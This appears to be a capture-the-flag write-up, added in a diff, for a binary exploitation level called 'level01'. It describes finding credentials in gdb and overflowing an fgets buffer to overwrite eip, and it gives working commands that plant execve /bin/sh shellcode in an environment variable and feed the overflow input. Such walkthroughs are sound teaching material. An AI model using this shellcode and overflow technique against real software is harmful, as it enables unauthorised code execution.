@@ -1,0 +1,9 @@
+The program is asking for a username and a password. We can know the username and the password by printing in gdb  values that are compared. The username is "dat_wil" and the password "admin".
+But the password doesn't work. We can also see that there is no call to system function.
+There is a segfault when we overwrite the first fgets buffer. We can have acces to the input of the second parameter password and to the eip return address (we need to specify at least the good username dat_wil). 
+We replace eip with adddress of our shellcode, store in an environment variable and launch our shell.
+
+$> export SHELLCODE=$(python -c 'print "\x90" * 200 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
+
+$> (python -c 'print "dat_wil" + "A" * 328 + "\xa6\xd8\xff\xff"' ; cat) | ./level01
+
